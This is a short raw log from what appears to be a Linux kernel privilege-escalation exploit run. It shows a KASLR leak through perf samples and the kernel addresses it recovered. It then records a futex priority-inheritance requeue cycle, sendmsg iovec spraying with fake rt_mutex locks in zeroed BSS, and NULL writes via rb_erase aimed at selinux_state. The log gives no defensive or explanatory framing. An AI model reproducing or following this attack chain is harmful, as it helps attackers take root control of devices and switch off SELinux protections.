[main] g_iov_idx=1 (override with IOV_IDX=k)  spray=sendmsg
[kaslr] perf text-base=ffffffdcec600000 min_kip=ffffffdcec79c004 samples=22
[kaslr] base=0xffffffdcec600000 slide=0x1ce4600000
  init_task   = 0xffffffdcf7243640
  selinux_state = 0xffffffdcf73a9d78 (enforcing @ +0)
  fake_lock   = 0xffffffdcf73ca880 (uid_lock+0x200, ZEROED BSS rt_mutex)
  fake_lock2  = 0xffffffdcf73ca980 (uid_lock+0x300, ZEROED BSS rt_mutex)
[Y] tid=12483
[X] tid=12484
[main] topology ready; FUTEX_CMP_REQUEUE_PI(cond) -> cycle
[main] CMP_REQUEUE_PI returned -35 (Resource deadlock would occur)
[main] -EDEADLK: full chainwalk caught PI cycle
[Y] PHASE1 spray: settle ghost (d=1 method=sendmsg: task@iov4, parent@iov0..3)
[Y] SPRAY-DEBUG iovstack base=0x274060  &iov[4]=0x2740a0  method=sendmsg
[Z] tid=12485
[Z] FUTEX_LOCK_PI(L2): walk into pi_blocked_on
[do_2] Z blocked on L2 — chain walk survived
[phase1] sched_setscheduler(Y) -> rb_erase NULL write to root (settle)
[phase1] chain walk OK (kernel alive)
[phase2] request re-spray (parent=selinux-8, lock=fake_lock2 @ uid_lock+0x300)
[Y] PHASE2 spray: d=1 parent=selinux-8 children=0 lock=fake_lock2
[phase2] sched_setscheduler(Y) -> rb_erase NULL write to selinux
EXIT=0
